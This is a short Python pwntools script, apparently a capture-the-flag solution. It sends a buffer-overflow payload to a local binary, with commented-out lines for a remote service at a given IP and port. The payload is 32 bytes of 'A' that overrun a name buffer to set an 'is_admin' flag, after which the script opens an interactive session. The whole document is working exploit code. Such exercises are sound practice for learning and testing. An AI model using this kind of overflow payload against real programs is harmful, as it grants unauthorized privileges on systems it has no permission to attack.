#!/usr/bin/env python3

from pwn import *

p = process("./a.out")
#p = process("/bin/nc 144.91.117.247 2647")
#p = remote("144.91.117.247", 2647)
payload = b"A" * 16 # name
payload += b"A" * 8 # pad
payload += b"A" * 8 # 4 bytes + is_admin

p.sendline(payload)
p.interactive()
